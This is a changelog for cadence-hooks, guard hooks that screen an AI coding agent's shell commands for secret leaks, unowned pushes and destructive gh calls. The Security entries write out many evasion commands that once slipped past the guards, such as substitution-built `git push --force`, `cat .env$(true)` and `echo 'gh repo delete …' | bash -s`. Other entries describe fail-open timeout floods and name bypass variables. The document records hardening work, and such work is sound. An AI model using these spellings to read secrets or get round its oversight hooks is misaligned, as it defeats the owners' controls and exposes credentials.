It fails closed on an unresolved push, an unsafe or unreadable refspec source, a source or tag that is not a commit (a tree or blob, or a tag of a tag), a submodule push (`--recurse-submodules=on-demand|only`, `push.recurseSubmodules`, `submodule.recurse`) in a repository with a top-level `.gitmodules` or an index gitlink, `git send-pack`/`git http-push`, a remote helper (`git remote-<transport>`, not the builtin `git remote`), a dashed `git-push` executable or an `exec -a` giving git a `git`-prefixed argv[0], a 40- or 64-hex source a ref is also named like (git pushes the ref, `rev-parse` reads the object), an outbound commit whose `encoding` header is not UTF-8/US-ASCII/ISO-8859-*, a config alias (persistent, alias-of-alias, opening with global options, options-only, or written by the same command) whose value names `push`/`send-pack` or starts with `!`, a non-builtin subcommand whose alias probe fails, cannot see the config the call reads (a `GIT_CONFIG*`/`GIT_DIR`/`GIT_COMMON_DIR`/`GIT_WORK_TREE`/`GIT_EXEC_PATH`/`XDG_CONFIG_HOME` name or `HOME=` anywhere in the command read without quotes and backslashes, an include, `--git-dir`/`--work-tree`/`--config-env`, an unresolvable directory) or that `help.autocorrect` would guess at, a subcommand word carrying `$` or a backtick, a failed, missing or timed-out git spawn, more than 2000 commits, an over-32 MiB patch, and an unreadable diff header. Deliberately allowed: `--dry-run`, pure deletions, a submodule-recursing push with no submodules, and commits already on any remote-tracking ref — which trusts as published a commit only on another remote (a private upstream pushed to a public fork), a remote-tracking ref an earlier command wrote or moved, and `pushurl`/`pushInsteadOf` redirects; and the content scan of **every file in a repository whose top-level path has a `cadence-hooks` component** — a whole-repo exemption keyed on the repository's own location (a `cadence-hooks/` directory inside another repository is scanned), with a known residual for any other checkout under such a component. A safe-template name (`.example`, `.template`, `.sample`, `.defaults`, `.test`, `.ci`, `.pub`) skips only the secret-name check; its content is still scanned. Over-blocks by design: `--tags`, `--mirror` and `--follow-tags` re-read tags the remote may already have. Not scanned: Git LFS content (only the pointer is committed), `gh repo create --push`, `git subtree push`, other `git-<name>` executables, and a push nested in another git command's exec string (`git rebase -x`, `git bisect run`, `git submodule foreach`, `git filter-branch` filters). The `help.autocorrect` existence check uses the hook's own `PATH`, and a submodule-recursing push over an index too large to list (over ~300k entries) is refused. `CADENCE_ALLOW_SECRET_PUSH=1` (hook environment) allows a would-be block and records a bypass row. Registered security-critical and protected; the plugin `hooks.json` entry follows in cameronsjo/cadence#1280, and must not filter on a literal `git push` or alias pushes never reach the guard. (cameronsjo/cadence-hooks#890)

### Security

- **Releases ship on the nightly verified merge (cadence-ecosystem ADR-0044).** `prepare-release.yml` keeps one `chore(main): release X.Y.Z` PR current from `[Unreleased]` (`### Fixed` only is a patch, anything else a minor), and `ship.yml` merges it only when the vendored ship gate verifies the PR's author, signed commits, and version-only diff with green CI. The release commit is made through the REST API so GitHub signs it, and `CHANGELOG.md` gains a `## [X.Y.Z] - DATE` heading under a kept `## [Unreleased]` instead of renaming it, so the diff only adds lines. Hand-opened `chore(release): X` PRs are retired.
- **`release.yml` refuses a tag whose commit is not on `main` with a green `CI` push run.** A new first `verify` job checks both before anything builds or signs, polling CI for up to 45 minutes. Permissions are per job: `build` reads only, and only `release` holds `id-token`, `attestations`, and `contents: write`. Every action is pinned by SHA, and `cross` and `cargo-cyclonedx` install at pinned versions. The Homebrew tap update moves to its own `homebrew` job, the only job in `release.yml` that holds the App key, which receives just the four checksums. The beta-prerelease cleanup step is removed; existing beta tags stay.
- **The App private key never shares a job with third-party code.** `auto-tag.yml` tags only a commit that is the App's own merge of its `chore(main): release X.Y.Z` PR, so a version bump that reaches `main` any other way no longer releases. It grants `GITHUB_TOKEN` read only, stops persisting credentials in `.git/config`, pushes the tag through `GIT_CONFIG_*` headers, and checks the `Cargo.toml` version against an anchored `X.Y.Z` pattern before writing it to `$GITHUB_OUTPUT`. `prices.yml` parses the pricing page in a job with no token and opens the PR from its artifact in a separate job. Every job that mints the key names the `release` environment. `SECURITY.md` now states what the signing identity proves and which controls cover the rest.

## [0.118.0] - 2026-09-30

### Added

- **`doctor`'s inert-permission lint now covers `permissions.ask`, `settings.local.json` and the project's settings, and flags redirect rows.** It still reports a `*` before a trailing `:*` (`Bash(rm /var/log/*:*)`), the class measured inert, and now also a row on an output redirect (`Bash(> path)`), which is checked against `Edit` rules only; each finding carries a fix hint. A `*` in the space-wildcard form (`Bash(git * main)`) is a real glob and is not reported. `allow` rows are not reported. Reporting only; whether the retained deny rows fire on a compound command (`cd x && rm -rf y`) is still unverified and needs a live-session probe. (cameronsjo/cadence-hooks#578)
- **`rules validate-frontmatter` also nudges on `skills:`/`mcpServers:` in an agent that describes teammate use (cameronsjo/cadence-hooks#615).** A definition that spawns a team teammate has both fields ignored, and the file shows no dispatch mode, so the signal is the description naming a "teammate" or "agent team" (the same keying as `lint-agent-tools.py`'s `teammate-ignored-field`). It applies to plugin agents and to `.claude/agents/` definitions, which are now classified so the teammate check can reach them; the plugin-only `hooks`/`mcpServers`/`permissionMode` nudge is unchanged and `.claude/agents/` still honours those. An agent that is a teammate without saying so is not caught.
- **`doctor` reports direction-aware drift for the deployed rule trees (cameronsjo/cadence-hooks#688).** `<config>/rules/cadence` and `<config>/rules/workbench` are compared file by file against the pinned `cadence` and `cadence-rules` plugin copies, and each differing file is classified from content alone: upstream-ahead (resync is safe), deployed-ahead (a local edit; re-add it upstream before resyncing) or diverged. Machine-local files with no upstream twin and upstream files never deployed are exempt, the check only reads, and it stays silent when the rules dir or the plugin cache is absent. `cadence-rules.md` stays with the existing single-file check.

### Changed

- **The two macOS release binaries now build on GitHub-hosted `macos-latest` instead of the self-hosted `ci-guest` VM on the M1 Max.** Asset names, targets (`aarch64-apple-darwin`, and `x86_64-apple-darwin` cross-compiled from arm64) and the tap dispatch are unchanged; attestation and signing still run in the hosted `ubuntu-latest` release job. This frees the M1 Max's second VM slot for the private runner pool (cameronsjo/homelab#1034).

### Fixed

- **`nudges` path globs match on Windows.** A drive path (`C:\repo\docs\a.md`) did not start with `/`, so it was read as already repo-relative and never matched a glob such as `docs/**`; an absolute file path is now judged against the repo root on every platform. Windows CI also runs the suite again: tests that build POSIX shell strings from native temp paths, or rely on Unix-only temp roots and symlinks, are scoped to Unix.

## [0.117.0] - 2026-09-30

### Added

- **`.claude/cadence.json` now suppresses individual nudges per repo, with optional path scoping.** `"nudges": { "<hook>": { "suppress": true | ["glob", ...] } }` silences that hook's `Nudge` outcomes (globs match the tool call's file path, repo-relative when they contain `/`, basename otherwise; a Bash-shaped call has no path, so only `true` silences it). A new required `suppressible` field on every `HOOKS` entry marks the 35 advisory hooks that may be named; dispatch enforces it and only ever rewrites a `Nudge`, so a `Block` or `Ask`, and every protected or security-critical guard, is untouched whatever the config says. A malformed file, entry, or glob suppresses nothing and never blocks. `doctor` warns on an unknown hook name, rejects a key naming a block, a protected guard, or a non-suppressible hook, and reports malformed entries and globs. `"feedbackFooter": false` turns off the block footer. The `CADENCE_*` env toggles keep working: env or config suppresses. Config suppression is not written to `bypasses.jsonl` (configured structure, like `Exemption`). (cameronsjo/cadence-hooks#216)
- **Guards can now resolve the effective repo of a target instead of the payload cwd's repo, and a session opened in a meta-repo is judged against the nested repo it works in.** A new `cadence_hooks_core::target_repo` primitive returns the innermost git repo containing a file or directory and how it relates to the cwd's repo (same checkout, other worktree, nested, enclosing, foreign), finds a gitignored nested repo the same as a tracked one, and reports `Ambiguous` rather than guessing for a `..` it cannot resolve, an over-long path, redirected git discovery, or a `.git` it cannot read. `terminology`'s cadence-hooks source exemption now keys off the edited file's repo (a nested `cadence-hooks/` checkout under a meta-repo cwd was blocked because the outer repo's name was consulted; an unrelated or enclosing repo named `cadence-hooks` still is), and `warn-branch-base` judges the repo a leading `cd` moves into and stays quiet when that directory does not exist instead of reading the hook process's own directory. (cameronsjo/cadence-hooks#225)

## [0.116.0] - 2026-09-30

### Added

- **Bypass provenance now covers the whole escape-hatch class, not just `enforce-worktree` and `warn-main-branch`.** `CADENCE_BYPASS=1` and a `CADENCE_DISABLE` that switches a hook off each write a `global_bypass` / `global_disable` row to `bypasses.jsonl` at the `main.rs` gate (hook label, session, repo basename only; write errors fail open). `CADENCE_SKIP_OVERSHARE_AUDIT`, `CADENCE_ALLOW_SUBAGENT_FROM_MAIN`, `CADENCE_ALLOW_BRANCH_INTENT`, `CADENCE_NO_OUTRO_BACKSTOP` (the `backstop-warn` half) and `CADENCE_GOING_PUBLIC_IGNORE` record an `env_switch` row when they actually suppressed a nudge. `enforcement-status` adds one SessionStart line with the repo's active dismissal count and the last 24h of bypasses used, by kind. A new `tests/bypass_provenance_coverage.rs` fails on any escape-hatch variable that is neither recording nor listed as deliberately not a bypass. `Exemption` and `EffortSkip` kinds are not added: both are configured structure, not an operator stepping outside a guard. (cameronsjo/cadence-hooks#223)

## [0.115.0] - 2026-09-29

### Security

- **`guard-gh-dangerous` reads a nested-substitution flood on an allowance and fails closed when it runs out.** `"$(x " * N + ")" * N` at ~250 KB cost about 0.65 s in release, and a hook past its deadline fails OPEN. The walk now arms `ExpansionWork`; once spent, the command is blocked only when it can spell `gh` and names `delete` (quotes and backslashes dropped, or a `$'…'` word), and allowed otherwise. A `delete` assembled from a substitution's output in a flood that size is not seen (cameronsjo/cadence-hooks#1141)
- **`enforce-worktree` folds a Windows verbatim path (`\\?\C:\repo`) like the plain drive path.** The fold read `\\?\C:\repo` as one relative segment, so `git -C '\\?\C:\repo' commit` was judged at `<cwd>/\\?\C:\repo` and the real target was never assessed, a fail-open on Windows. The prefix is stripped (`\\?\UNC\srv\share` becomes `//srv/share`) before folding and the result is absolute; `strip_verbatim_prefix` moved from `trash-guard` into core. (cameronsjo/cadence-hooks#513)
- **`guard-gh-write` follows a runner's directory change into a shell it wraps.** `sudo -D <unowned> sh -c 'gh pr create'` and `env -C <unowned> bash -c '…gh pr create…'` judged the script in the directory the runner was in; the script's segments are now also judged in the runner's resolved directory (an unreadable one blocks). `env -C <owned> sh -c 'gh pr create'` and a plain `sh -c 'gh pr create'` in an owned checkout stay allowed. (cameronsjo/cadence-hooks#1141)
- **A command substitution that prints a literal is judged as the text it prints, and one glued into a word is read as a glob.** `$(echo git) push --force`, `` `echo git` push ``, `git push $(echo --force)`, `gh $(echo repo) delete`, `$(echo sops) -d f`, `$(echo rm .env)` and `eval "$(echo 'cat .env')"` exited 0 in every owning guard; `command_segments` now surfaces the evaluated reading of a plain `echo`/`printf` body beside the segment as written, and `guard-sops-decrypt` walks it as a whole script. `cat .env$(true)`, `cat .en$(echo)v` and `echo x > .env$(:)` also passed: a substitution glued into a word is read as `*`, so the word is judged as the glob it may expand to (`"$(pwd)"/x.txt` and a substitution standing alone as a word are unchanged). Output the shell would not re-parse (`;`, `>`, `$`) is re-emitted single-quoted, and a differential test runs both spellings under bash. A substitution that is not a literal `echo`/`printf` is unchanged. (cameronsjo/cadence-hooks#1142)
- **`${NAME/pat/rep}`, `${NAME//pat/rep}` and `NAME[idx]=v` are modelled.** `D=x; cat ${D/x/.env}`, `a[1]=.env; cat ${a[1]}` and `m[k]=.env; cat ${m[k]}` exited 0. A literal pattern is carried out, and the replacement is the candidate the alternate reading takes for any other pattern; an element assignment is stored under its own key and joins `${NAME[@]}`, which is what an associative key the walk cannot evaluate reads. `C=x; ${C:-sops} -d f` blocks under `guard-sops-decrypt` as well, which now judges the resolved readings of a script. `wget --certificate=…` is still open here (fixed on `claude/gambit-shell-triage-sep29`). (cameronsjo/cadence-hooks#1134)
- **`guard-gh-dangerous` judges a literal piped into a shell as a script.** `echo 'gh repo delete o/r --yes' | bash -s` exited 0. The `echo`/`printf` producer of a `| bash`/`| sh -s` stage is read by the helper `prevent-secret-leaks` uses for `echo 'cat .env' | bash` (`piped_shell_scripts`), and its text is judged like any other command, through nested literals. A producer that is not a literal (`cat notes.md | bash`) is unchanged. (cameronsjo/cadence-hooks#544)
- **The segment splitter's `"$( … )"` scan no longer has a retry cap an attacker can outrun.** After the #1143 fix, an input with more than about 3 KB of unclosed `"$(` before an odd-quote commit heredoc tripped the 1024-retry latch and reopened the evasion. The scan now keeps its nested levels on the heap and records each level's outcome by start offset, so a retry at an offset already scanned costs O(1) and the cap is gone; a span nested inside an unclosed one is still bounded. Nesting is unlimited up to 262 144 levels (an input over 750 KB), where the pass stops asking, as it does after the fresh-scan work allowance (8 times the input) is spent on openers no earlier scan read. The 200 KB floods stay under 0.5 s in release. An odd number of unclosed `"$(` in front is not covered: bash rejects that command. (cameronsjo/cadence-hooks#1143)
- **`guard-gh-write` follows `env -C DIR` and `sudo -D DIR` (and `--chdir`) into the directory the write runs in.** From an owned checkout, `env -C <unowned> gh pr create` and `sudo -D <unowned> gh pr create` exited 0. DIR resolves like a `cd` target; a DIR that cannot be read (`$VAR`, `$(…)`, a glob, `~user`, empty) is unresolvable and blocks. A runner option the peel does not model (`timeout --weird 5 gh pr create`) now leaves the directory unresolvable and blocks, mirroring the push walk's `hides_a_push_behind_a_prefix`. `sudo gh pr create` and `env FOO=1 gh pr create` in an owned checkout stay allowed. (cameronsjo/cadence-hooks#1141)
- **`enforce-worktree` and `guard-gh-write` refuse a command too large to read instead of timing out into an allow.** A 200 KB flood of `"$(cat <<E` substitution heredocs cost 2 s (`enforce-worktree`) and 3.7 s (`guard-gh-write`) in a release build, past the hook deadline, which fails open. The union path now spends one work allowance across its walks and readings; `command_segments` gains an opt-in `ExpansionWork` allowance that `guard-gh-write` arms. When either runs out, a command that mentions a commit is judged from the session cwd and reported as an unreadable `cd`, and `guard-gh-write` blocks. The 200 KB floods now finish in under 0.5 s. `guard-push-remote` also refuses a push behind a command runner whose option the peel does not model, so `sudo -D DIR git push` / `sudo --chdir=DIR git push` are no longer invisible to the push walk. (cameronsjo/cadence-hooks#1141)
- **The segment splitter no longer stops bounding `"$( … )"` spans for the rest of a command after one span nests past the depth cap.** With 17 or more nested `"$(` early in a command, a later commit heredoc holding an odd `"` opened a phantom quote over `cat .env`, and `prevent-secret-leaks` exited 0 (N=16 exited 2). The latch in `split_segments`, `comment_spans` and the heredoc line scanner now trips only for a span that ran to the end of the input, or after 1024 too-deep retries in one pass. (cameronsjo/cadence-hooks#1143)
- **The same splitter latch is local to the too-deep span, and `enforce-worktree`'s union scan is budgeted.** `echo $(cat <<E` followed by `E)` lines took 0.8 s in release; it now stays under the work allowance and blocks a commit when the allowance is spent. (cameronsjo/cadence-hooks#1137)
- **`enforce-worktree` judges a commit target the command itself creates by its nearest existing ancestor.** `mkdir -p <primary>/x && cd <primary>/x && git commit` and `mkdir -p 2'>'x; git -C 2'>'x commit` named a directory that did not exist when the hook fired, so it read as "no repo" and failed open. The target now resolves to the closest ancestor that exists, so a commit inside a primary checkout blocks. A path the same command makes with `git worktree add`, `git clone` or `git init` is still exempt (a new repository), and a commit beneath a symlink the command creates with `ln -s` is unknown and blocks, since the link can point into a primary. A relative creation path is trusted only when the command is walked in order (cameronsjo/cadence-hooks#1083)
- **`enforce-worktree` sees a whole `git commit` written as one brace word.** `{git,commit,-m,x}` and `{git,-C,<primary>,commit,-m,x}` exit 0: the segment cleaner dropped the word's closing `}` as group syntax, so it never expanded. A `}` now closes a group only as a word of its own. A brace expansion past core's bounds in a command that mentions `git` or `commit`, or that has a brace word in command position, is unreadable and blocks from a linked worktree too (cameronsjo/cadence-hooks#1115)
- **`enforce-worktree` pins that an unresolvable `cd` target blocks a commit from a linked worktree.** `cd "$VAR"`, `cd $(…)`, `cd <glob>` and `cd ~user/…` before a commit already block with the `git -C <path>` guidance, from a primary and from a worktree; the 2026-09-28 comment describing a worktree allow does not reproduce on current main, so this adds table tests and no behavior change (cameronsjo/cadence-hooks#346)
- **`trash-guard` judges a brace-expanded redirect target as the names bash writes.** `echo x > note.m{d..d}` inside a vault truncated `note.md` and exited 0, because the redirect parser hands back the target unexpanded; the written name and each expansion are now both judged, so a quoted or literal brace target is still judged as written. `{md..md}` (which bash leaves literal) stays allowed. (cameronsjo/cadence-hooks#1115)

### Added

- **Cloud sessions get a per-hook remote policy and an ARMED/INERT line.** Every registry entry now declares `remote: RemotePolicy` (`Run`, `SelfDisable`, `BlockWithReason`), enforced at dispatch and in `group` before any stdin is read: under `CLAUDE_CODE_REMOTE=true` a `SelfDisable` hook exits 0 with no output (the session registry and lanes, `persist-plan-approval`, `enforce-worktree`, `nudge-upgrade-after-push`, and every metrics logger). `enforcement-status` adds one SessionStart line, `cadence-hooks: ARMED vX.Y.Z` when `CADENCE_ALLOWED_OWNERS` is non-empty and `cadence-hooks: INERT (allowed owners not configured)` otherwise, and `warn-commit-provenance` stamps `Machine: cloud`. `manifest` exports the policy as `remote`, `docs/hooks.md` gains a Remote column, and a table test drives every hook through the binary. (cameronsjo/cadence-hooks#1197)
- **`git-safety` nudges when a command runs text it cannot read.** A script file (`bash x.sh`, `sh x.sh`, `./x.sh`, `source x.sh`), an `eval` of text no walk resolved (tool init such as `eval "$(ssh-agent -s)"` or `direnv hook`, per `eval_is_tool_init`, stays silent; `direnv export` still nudges), and a command or a `git`/`gh` subcommand named by a substitution that is not a literal `echo`/`printf` (`$(which python) x.py`, `"$(git rev-parse --show-toplevel)/x.sh"`) get one nudge per command saying the executed command is not visible to the guards. Nothing new blocks, the nudge yields to a block and to the guard's own nudge, and a command too large to read within the expansion allowance goes unnudged. (cameronsjo/cadence-hooks#456)
- **`ToolInput` models the Agent/Task `prompt`, `description` and `model`.** A live PreToolUse probe (claude-code 2.1.271) showed the dispatch prompt and label are on the wire; they were landing unread in `extra`. Accessors `agent_prompt()`, `agent_description()` and `agent_model()` sit beside `subagent_type()`. (cameronsjo/cadence-hooks#374)
- **`guardrails warn-agent-dispatch` warns on an Agent/Task dispatch with no `model`, or a `model` on a fork.** A non-fork dispatch that omits `model` inherits the session's most expensive tier; a `model` on a fork dispatch (`subagent_type` `fork` or omitted) is ignored by the platform. Advisory only. Built unwired: the hooks.json entry lands in a follow-up cadence monorepo PR. The `SendMessage` arm is not built. (cameronsjo/cadence-hooks#606)
- **`warn-agent-dispatch` nudges when a brief asks a subagent to execute commands without naming a scrubbed or isolated HOME.** A narrow phrase match ("execution oracle", "run the corpus", "run each command", "in a real shell", ...) with no containment wording ("scratch home", "sandbox", `HOME=`, `env -i`, `bash -n`, "do not run", ...) names the requirement; the prompt is never echoed. This is the nudge tier only, not the structural control the issue asks for. (cameronsjo/cadence-hooks#837)
- **`guard-forge-write` blocks `tea` and `glab` writes to repos outside the owner allowlist.** `glab mr create/merge/note/close`, `glab issue create/note/close`, `glab repo create/delete` and the `tea` pulls/issues/repos/comment equivalents are judged against `CADENCE_ALLOWED_OWNERS`/`CADENCE_ALLOWED_REPOS`; an unowned target, or one the command does not name, blocks, and reads pass. A bare `-R owner/repo` matches hosts in `CADENCE_EXTRA_HOSTS` only (`glab` also `gitlab.com`, `GITLAB_HOST`/`--hostname` honored), never the GitHub default. `glab api`, `tea api` and raw `curl` stay uncovered. Registered but unwired: the `cadence-guardrails` hooks.json entry (`PreToolUse`, single-rule `if: Bash(glab *)` and `Bash(tea *)`) lands in the plugin repo. (cameronsjo/cadence-hooks#355)
- **`doctor` lints installed command hooks that may hang on empty stdin.** A static heuristic over each plugin's `hooks.json`: a bare `cat`, `read` (no `-t`) or `jq` that heads its pipeline with no input file and no stdin redirect (`</dev/null`, heredoc, here-string) is reported as an advisory warning. Nothing is executed, so it is the option-(a) lint, not the run-with-empty-stdin probe. (cameronsjo/cadence-hooks#616)
- **`doctor` lints `permissions.deny` rows that can never fire.** A `Bash(...:*)` row with a `*` inside its argument (the six rows measured inert on 2.1.273) and a `Bash(> path)` redirect row (redirects are checked against `Edit` rules) are reported as advisory warnings. Reporting only; whether the retained rows fire on compound commands (`cd x && rm -rf y`) needs a live-harness probe this does not make. (cameronsjo/cadence-hooks#578)

### Changed

- **`core::shell::ends_inside_quote` is the one quote-balance scan.** `guard-gh-dangerous` carried a private copy of the `Quote` model (which had already drifted from bash twice); it now calls the shared scan, which reads `'…'`, `"…"` and `$'…'` with the odd-run `$` rule. `core::shell` itself no longer has the even-run `$` bug the issue names (fixed earlier by `dollar_is_quote_sigil`), and a `bash -n` oracle sweep over every string of length <= 5 (opt-in, `--ignored`) agrees on all 9,331. No verdict changes. (cameronsjo/cadence-hooks#549)
- **`enforce-worktree` pins that a path's classification does not depend on its separator flavour, and characterizes the Windows verbatim prefix.** A hand-enumerated table (drive-letter case x `/`, `\\` or mixed separators x fourteen path shapes) asserts the fold, the target key, the linked-worktree exclusion and the commit target agree, and a `#[cfg(windows)]` test pins the whole verdict for a native path and its forward-slash twin. The `\\?\` verbatim prefix is not folded today (`git -C '\\?\C:\repo' commit` resolves to `<cwd>/\\?\C:\repo` and the cwd); a test records that rather than endorsing it. Tests only, no behavior change. (cameronsjo/cadence-hooks#513)
- **The `enforce-worktree` block message names the ff-merge path for live-state and release-style repos.** In an auto-mode session both the settings edit and the dismiss can be refused by the permission classifier; the message now says the sanctioned route is to edit and commit in a worktree, then `git merge --ff-only <branch>` on the primary. Message only, no verdict change (cameronsjo/cadence-hooks#717)
- **Guard tests take env-derived policy as parameters instead of mutating process env.** `guard-sops-decrypt`, `warn-subagent-worktree`, `guard-read-model`, `warn-going-public` and `warn-main-branch` gain `run_with*` seams beside `Check::run`, so their tests no longer take `CADENCE_ENV_TEST_LOCK` and can run in parallel; four `nudge_message` tests drop an env wrapper they never needed. Production behavior is unchanged. The remaining `with_env` sites (`guard_gh_write`, `guard_push_remote`, `warn_issue_tracker`, `guard_body_budget`, `redact_external_content`, `warn_overshare`) need cross-module allowlist or metrics-dir API changes and stay. (cameronsjo/cadence-hooks#486)
- **`core::worktree` tests use the shared `git_fixtures::init_repo`.** The hand-rolled `init_repo_with_commit` is gone; the `scratch_root()` helpers already sit on the relocating `Scratch`, and folding them into a macro is left open. (cameronsjo/cadence-hooks#504)

### Fixed

- **`guard-gh-write` reads `cd "$(git rev-parse --show-toplevel)"` as the checkout root it runs in.** The exact substitution, in either quoting and with an optional `-C <dir>`, resolves through the in-process `GitState` root instead of an unresolvable directory; a suffix, another `rev-parse` query, a single-quoted or escaped spelling, a `GIT_*` mention and a command that may have replaced `git` keep blocking (cameronsjo/cadence-hooks#1172)
- **Tool-initialisation `eval`s no longer read as an unresolvable directory change.** `eval "$(ssh-agent -s)"`, `direnv hook`, `brew shellenv`, `pyenv init -`, `rbenv init -`, `starship init`, `zoxide init`, `fnm env` and `mise activate` are matched by exact substitution head, shared by the write walk, the push walk and the `GH_HOST`/`GH_REPO` tracker; any other `eval`, `direnv export`, `zoxide init --cmd`, and a command that may redefine the tool (a same-named function, `PATH=`, `alias`) keep today's verdict (cameronsjo/cadence-hooks#1172)
- **`guard-push-remote` no longer lets a subshell's `cd` move the parent's push.** `(cd <unowned> && git status); git push origin HEAD` is judged in the directory the push runs in; a push inside the subshell, a brace group, and any script containing a `case` (whose `pattern)` arms read as closers) keep the leak (cameronsjo/cadence-hooks#1172)
- **`popd` returns to the directory before its matching `pushd` in the write walk.** `pushd sub && make && popd && gh pr create` is judged in the starting directory; an unmatched `popd`, `popd -n`/`+N`, a bare `pushd`, `dirs`, and a `pushd` that may not have run keep the unresolvable verdict (cameronsjo/cadence-hooks#1172)
- **A bare `gh repo clone REPO` is judged as the account gh is signed in to.** The owner is read from gh's own config (`$GH_CONFIG_DIR`, else `$XDG_CONFIG_HOME/gh`, else `~/.config/gh`, `hosts.yml` `user:`) with no network access; an unreadable file, no `user:`, a token variable, `gh auth`, or a `GH_CONFIG_DIR` written in the command keeps the block (cameronsjo/cadence-hooks#1172)
- **`guard-push-remote` judges `git -c alias.p=push p origin feat` as the push it is.** An alias defined as exactly `push` resolves to `push`, and its destination is judged wherever it runs; a `!` alias, a value with anything else in it, and a `--config-env` alias keep the block (cameronsjo/cadence-hooks#1172)
- **`prevent-secret-leaks` splits a word at `:` past 16 KiB only when a `git` object reader is written.** `key: value`, `id_rsa:` and `.env:` in a long YAML body stop blocking; `git show`, `cat-file`, `log` and `diff` with `<rev>:<path>` still do, whatever global options sit between (cameronsjo/cadence-hooks#1172)
- **`trash-guard` skips the values of `truncate -s`/`--size` and `-r`/`--reference`.** `truncate -s 0 /tmp/x` from a vault cwd is judged by `/tmp/x`, not by the `0`; every other operand, including one after `-r`, is still judged (cameronsjo/cadence-hooks#1172)
- **`warn-overshare` stays silent on `gh api` requests that post no prose.** `/markdown` and `/markdown/raw` are render-only, and a write is judged only by its `body`, `title`, `description`, `text` and `message` fields (nested `commit[message]` and endpoint query strings included); GraphQL and `--input` keep nudging, and the leak scan's gate is unchanged (cameronsjo/cadence-hooks#1172)
- **The backstop's "last session out" gate counts live sessions in sibling worktrees.** Each worktree keeps its own `.claude/sessions` registry, so two sessions in sibling worktrees of one repo each saw themselves as last out and each recorded the other's in-progress work as loose ends. The gate now reads the union of the repo's worktree registries, the same enumeration `session status` uses. If `git worktree list` cannot answer it checks only its own registry, as before. `registry::sessions_dir` and the lane guards stay per-working-tree by design. Part 1 of #928 only. (cameronsjo/cadence-hooks#928)
- **The polish marker lives under the Claude config dir, not the shared temp dir.** It moves to `<config dir>/cadence-hooks/markers` (`0700`, honors `CLAUDE_CONFIG_DIR`), which has no shared base to fail open into, so a co-tenant can no longer plant it. Markers recorded in the old temp-based directory are still read for one release, and only when that directory is private. A `CADENCE_MARKER_DIR` override still wins. The rest of the marker family stays in the temp dir. Part 2 of #565 only; part 3 (a `sha` staleness verdict) is already covered by the `diff_digest` comparison from #874. (cameronsjo/cadence-hooks#565)
- **`guard-body-budget` no longer measures a body file the same command writes.** `printf … > body.md && gh issue create --body-file body.md` measured the stale on-disk file, so a 500-word body posted against a 5-word file read as under budget. When an earlier segment of the command writes the body path (redirect, `tee`, `cp`, `mv`), the guard nudges "cannot measure the body — it is written by this same command" instead. A same-final-name path also matches, so an unrelated file with the same name gets the nudge rather than a stale measurement. Heredoc bodies quoting a `gh` command were already ignored. (cameronsjo/cadence-hooks#984)
- **A ship inside a `sh -c`/`bash -c` wrapper that `cd`s elsewhere is reported as "cannot check" by the polish gate.** `sh -c 'cd /some/worktree && gh pr create'` was judged against the unchanged outer directory, so a polish marker there could vouch for an unpolished worktree; the ship now resolves as unresolvable and the gate and its ledger say so. Nudge path only, never a block. (cameronsjo/cadence-hooks#448)

## [0.114.0] - 2026-09-29

### Security

- **`prevent-secret-leaks` judges `find … | xargs <reader>` as a read of the secret-shaped name `find` selects.** `find /evil -name .env | xargs cat` (also `-print0 | xargs -0`, `head`, `tail`, `less`, `grep`, `sh -c`) is blocked when a `-name`/`-iname`/`-path`/`-ipath`/`-regex` names a secret-shaped file, with no `.envrc` carve-out because the match lies outside the cwd; a `find` with no secret-shaped selector, and `xargs ls`/`wc`/`rm`, stay allowed. (cameronsjo/cadence-hooks#1081)
- **`prevent-secret-leaks` reads command text a per-segment scan never saw.** A heredoc fed to a shell (`bash <<EOF`, `sh -s`, `source /dev/stdin`, `… <<EOF | bash`, inside `$(…)`) has its body judged as commands; `echo`/`printf` literals piped into `xargs <reader>` or into a shell are judged; the values of `EDITOR=`/`VISUAL=` before `git`, `git config core.editor`-style command keys, `git submodule foreach` and `git difftool --extcmd`/`-x` are judged as commands. Text it cannot read (`eval "$(cat f)"`, `… | bash` from a non-literal producer, `bash <(…)`, `bash -c "$(…)"`) now draws one nudge saying the executed text is not visible to the secret guard, never a block, and only when the command is otherwise allowed. (cameronsjo/cadence-hooks#1082)
- **`doctor --prune --apply` checks for running `claude` processes and refuses when it cannot enumerate them.** The registry gate cannot see a session idle at the prompt past the 30-minute window, or one whose cwd is outside any git repo, so a prune could delete version dirs such a session was still reading. `--apply` now counts local `claude` processes (via `ps`, no network) and refuses when more run than live registry records account for; with `--keep-newest`/`--older-than` the unaccounted process makes every dir count as possibly read instead. A missing or failing `ps` fails closed. `CADENCE_DOCTOR_PRUNE_FORCE=1` still overrides, and a dry run never refuses. (cameronsjo/cadence-hooks#902)
- **`polish_marker_present` requires the private marker directory.** It was a bare `.is_file()` while `read_polish_marker` already refused a degraded dir, so on the shared fail-open base a co-tenant could plant the predictable marker name and satisfy the gate. A degraded dir now reads as absent, which nudges. Part 1 of #565 only; the config-dir move and the `sha` staleness verdict are separate. (cameronsjo/cadence-hooks#565)
- **`redact-external-content` reads the bodies it could not see before, and says when it still cannot.** A body read from standard input (`--body-file -`, `-F -`, `-F x=@-`, `--input -`) is now scanned when the command line shows the text: a heredoc or here-string on the command, or the literals of an `echo`/`printf` (or a `cat` heredoc) piped into it; it blocks like any body and never blocks on standard input alone. A file it cannot read (missing, unreadable, not a regular file, not UTF-8, or over the 1 MiB cap) and standard input it cannot see now print one stderr line naming the cause; the verdict is unchanged (fail open), and a machine with no term source prints nothing. `gh gist create` and `gh gist edit` scan the contents of the files they name (`--add` included), `gh label create/edit -d/--description` joins the gate, and a non-GET `gh api` endpoint's percent-decoded query string is scanned as posted text. The shaped nudges (skill IDs, local paths) now read the value the shell passes as the identity tier does, so `cadence\:attune` no longer slips past them. (cameronsjo/cadence-hooks#1171)
- **The Windows plan-store reader verifies the opened handle by identity, not by length and times.** `persist-plan` now compares the volume serial number and file index from `GetFileInformationByHandle` against a second handle on the canonical path, requires a link count of 1 (an NTFS hardlink is refused) and a non-directory, and prefix-checks `GetFinalPathNameByHandleW` against the canonical store root; `windows-sys` becomes a `cfg(windows)`-only direct dependency. The Unix path is unchanged. Compile-checked for `x86_64-pc-windows-gnu`, not run on Windows. (cameronsjo/cadence-hooks#1147)
- **A closed stdout pipe on Windows no longer reports an internal error.** Every stdout write now goes through `cadence_hooks_core::out!`/`outln!`, which drop a `BrokenPipe` (the reader left) and still panic on any other write failure; `tests/no_bare_println.rs` fails if a bare `println!`/`print!` reappears in shipped source. (cameronsjo/cadence-hooks#980)
